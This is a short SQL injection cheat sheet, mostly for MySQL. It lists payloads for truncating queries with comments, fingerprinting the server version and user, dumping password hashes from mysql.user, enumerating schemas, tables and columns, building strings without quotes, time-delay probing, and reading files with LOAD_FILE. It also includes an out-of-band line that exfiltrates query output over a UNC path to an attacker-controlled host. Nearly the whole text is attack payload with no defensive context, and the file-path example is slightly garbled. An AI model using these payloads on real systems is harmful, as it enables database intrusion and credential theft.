```bash
Comments
#
/*
-- -
;%00


Version
SELECT VERSION();
SELECT @@VERSION;
SELECT @@GLOBAL.VERSION;


User details
user()
current_user()
system_user()
session_user()
SELECT user,password FROM mysql.user;


Database details
use <<<db>>>
SELECT db_name();
SELECT database();
SELECT schema_name FROM information_schema.schemata;
LIST DB
SELECT name FROM master..sysdatabases;

Database credentials
SELECT host, user, password FROM mysql.user;


Server details
SELECT @@hostname;


Table Name
SELECT table_name FROM information_schema.tables;


Columns Names
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';


No Quotes
CONCAT(CHAR(97), CHAR(98), CHAR(99))


String Concatenation
CONCAT(foo, bar)

 
Conditionals
SELECT IF(1=1,'true','false');

 
Time-delay
Sleep(10)


Command Execution
http://dev.mysql.com/doc/refman/5.1/en/adding-udf.html


"RunAs"
N/A


Read Files
SELECT LOAD_FILE('C:Windowswin.ini');


Out-of-Band Retrieval
SELECT LOAD_FILE(concat('\\',(SELECT 1), 'attacker.controlledserver.com\')));


Substrings
SELECT substr(‘Foobr’, 1, 1);


Retrieve Nth Line
SELECT * FROM table ORDER BY ID LIMIT 3,1
```
